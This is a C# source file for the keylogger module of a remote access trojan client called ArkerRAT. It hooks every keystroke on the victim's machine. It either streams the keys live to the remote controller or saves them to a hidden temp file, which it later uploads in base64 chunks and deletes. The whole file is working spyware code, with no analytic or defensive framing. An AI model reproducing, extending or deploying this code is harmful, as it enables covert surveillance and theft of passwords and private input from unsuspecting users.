using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;
using MouseKeyboardActivityMonitor;
using ArkerRATClient;
using MouseKeyboardActivityMonitor.WinApi;


namespace ARKERRATCLIENT2._0
{
    static class KeyLogger
    {
        public static void HandleData(string subString)
        {
            if (subString.Contains("§OFK§"))
            {
                subString = subString.Replace("§OFK§", string.Empty);

                if (subString == "close")
                {
                    CloseOfflineKeyLogger();
                }
                else if (subString == "start")
                {
                    StartOfflineKeylogger();
                }
            }
            else if (subString.Contains("§live§"))
            {
                subString = subString.Replace("§live§", string.Empty);

                if (subString == "close")
                {
                    CloseLiveKeyLogger();
                }
                else if (subString == "start")
                {
                    StartLiveKeyLogger();
                }
            }
            else if (subString == "start")
            {
                keyLoggingThread = Task.Run(() => StartKeyLogger());
            }
            else if (subString == "close")
            {
                StopKeyLogger();
            }
        }

        static KeyboardHookListener keystrokesListener;
        static bool keyLogging = false;
        public static Task keyLoggingThread;
        public static void StartKeyLogger()
        {
            keyLogging= true;
            
            keystrokesListener = new KeyboardHookListener(new GlobalHooker());
            keystrokesListener.Start();
            keystrokesListener.KeyPress += RetrieveKey;
            keystrokesListener.KeyDown += RetrieveNonCharactherKeys;

            while (keyLogging && !RATClientSession.noConnection)
            {
                Application.DoEvents();
                Task.Delay(5).Wait();
            }

            keystrokesListener.KeyPress -= RetrieveKey;
            keystrokesListener.Stop();
            keystrokesListener.Dispose();
        }

        public static void StopKeyLogger()
        {
            liveKeyLogging= false;
            keyLogging= false;
            keyLoggingThread.Wait();
        }

        private static void RetrieveKey(object sender, KeyPressEventArgs e)
        {
            if (liveKeyLogging)
            {
                SendLiveKeyStroke(e.KeyChar.ToString());
            }

            if(offlineKeyLogging)
            {
                WriteOfflineKeyLogs(e.KeyChar.ToString());
            }
        }

        private static void RetrieveNonCharactherKeys(object sender, KeyEventArgs e)
        {
            if (liveKeyLogging)
            {
                string key = e.KeyCode.ToString();

                if (key.Length > 2 && !(key == "Space" || key == "LShiftKey" || key == "Return"))
                {
                    SendLiveKeyStroke("<"+key+">");
                }
            }

            if (offlineKeyLogging)
            {
                string key = e.KeyCode.ToString();

                if (key.Length > 2&& !(key == "Space" || key == "LShiftKey"||key=="Return"))
                {
                    WriteOfflineKeyLogs("<"+key+">");
                }
            }
        }



        static string _ofPath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\Ader4tr4euitred8u4f4ui87rteyu.txt";
        static bool liveKeyLogging = false;
        public static async void StartLiveKeyLogger()
        {
            liveKeyLogging = true;
        }
        public static async void CloseLiveKeyLogger()
        {
            liveKeyLogging = false;
        }
        private async static void SendLiveKeyStroke(string chr)
        {
            await RATClientSession.SendData("§KeyLoggerStart§" + chr + "§KeyLoggerEnd§");
        }

        

        static bool offlineKeyLogging = false;
        public static async void StartOfflineKeylogger()
        {
            offlineKeyLogging = true;
        }
        private static void WriteOfflineKeyLogs(string chr)
        {
            File.AppendAllText(_ofPath, chr);
        }  
        public static async void CloseOfflineKeyLogger()
        {
            offlineKeyLogging = false;
           sendKeyLogFileThread=Task.Run(()=> SendFileChunks());
        }   
        public static Task sendKeyLogFileThread;
        public static async void SendFileChunks()
        {
            using (FileStream fileStream = new FileStream(_ofPath, FileMode.Open, FileAccess.Read))
            {
                await RATClientSession.SendData("§KeyLoggerStart§§OFK§start§KeyLoggerEnd§");

                while (!RATClientSession.noConnection)
                {
                    byte[] buffer = new byte[8192];
                    int bytesRead = fileStream.Read(buffer, 0, buffer.Length);

                    if (bytesRead == 0)
                    {
                        break;
                    }

                    await RATClientSession.SendData("§KeyLoggerStart§§OFK§" + Convert.ToBase64String(buffer, 0, buffer.Length) + "§KeyLoggerEnd§");
                }
                fileStream.Close();
                await RATClientSession.SendData("§KeyLoggerStart§§OFK§end§KeyLoggerEnd§");
            }
            File.Delete(_ofPath);

        }
    }


}
